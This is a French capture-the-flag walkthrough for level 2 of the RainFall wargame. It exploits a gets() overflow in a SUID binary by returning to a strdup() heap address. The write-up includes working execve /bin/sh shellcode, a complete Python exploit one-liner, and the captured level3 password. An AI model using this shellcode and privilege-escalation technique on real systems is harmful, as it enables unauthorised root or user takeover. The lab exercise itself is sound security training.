# Level 2

- On execute le binaire

```bash
level2@RainFall:~$ ./level2
test
test
```

- Le programme attend une entrée, puis la display


- On vérifie les permissions du binaire:

```bash
level2@RainFall:~$ ls -l level2
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

- le binaire a le bit SUID activé avec les permissions de level3, ce qui signifie que si on arrive à exécuter du code arbitraire, on aura les privilèges de level3

## Analyse avec GDB

- On désassemble le programme:

```bash
gdb ./level2
(gdb) info functions
[...]
0x080484d4  p
0x0804853f  main
[...]
```

- On remarque deux fonctions : main() et p()
- On analyse d'abord p()

```bash
(gdb) disas p
```

## Comprendre le code

- Ce que fait la fonction p():

1. fflush(stdout): vide le buffer de sortie
2. gets(buffer): lit l'entrée utilisateur (vulnérabilité)
3. Vérification d'adresse: vérifie si l'adresse de retour pointe vers la stack (`0xb0000000`)
4. puts(buffer): affiche l'entrée
5. strdup(buffer): duplique la chaîne dans la heap

## Vulnérabilité:

- Vulnérabilité: gets() ne limite pas la taille de l'entrée: buffer overflow possible

- Probleme: La condition "if ((unaff_retaddr & 0xb0000000) == 0xb0000000)" empêche d'exécuter du code sur la stack (adresses commençant par 0xb...): elle le repère et le "bloque"

- Solution: Utiliser la heap
- La fonction strdup() alloue de la memoire sur la heap et y copie notre entrée

## Trouver l'adresse de la heap

- On doit identifier ou strdup() va placer nos données
- On utilise l-trace pour tracer les appels système:

```bash
level2@RainFall:~$ ltrace ./level2
```

- On entre une chaîne simple et observe la sortie
- On remarque que strdup() retourne toujours la même adresse: 0x0804a008

## Trouver l'offset jusqu'à EIP

- On doit trouver combien d'octets sont nécessaires avant d'écraser l'adresse de retour (EIP):

```bash
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Le programme crashe. On regarde la valeur d'EIP :

```bash
(gdb) info registers eip
```

- Si EIP contient 0x41414141 ('AAAA'), on est en train d'écraser EIP
- J'affine le nombre d'octets, je découvre que 80 octets permettent d'atteindre EIP

## Construire le shellcode

- On a besoin d'un shellcode qui exécute `/bin/sh`
- Un shellcode classique de 25 octets:

```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Ce shellcode :
- Met à zéro EAX
- Pousse "/bin/sh" sur la stack
- Appelle execve("/bin/sh", NULL, NULL)

## Calculer le padding

On a:
- 25 octets de shellcode
- 80 octets total pour atteindre EIP
- Donc 55 octets de padding (80 - 25)

## Construire le payload

- le payload final sera:
```bash
[shellcode de 25 octets] + [55 'A' de padding] + [adresse heap en little-endian]
```

L'adresse `0x0804a008` en little-endian devient : `\x08\xa0\x04\x08`

## Exploitation

```bash
(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 55 + '\x08\xa0\x04\x08')"; cat) | ./level2
```

- ;cat garde le shell ouvert pour pouvoir interagir avec lui.

### Final:
```bash
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

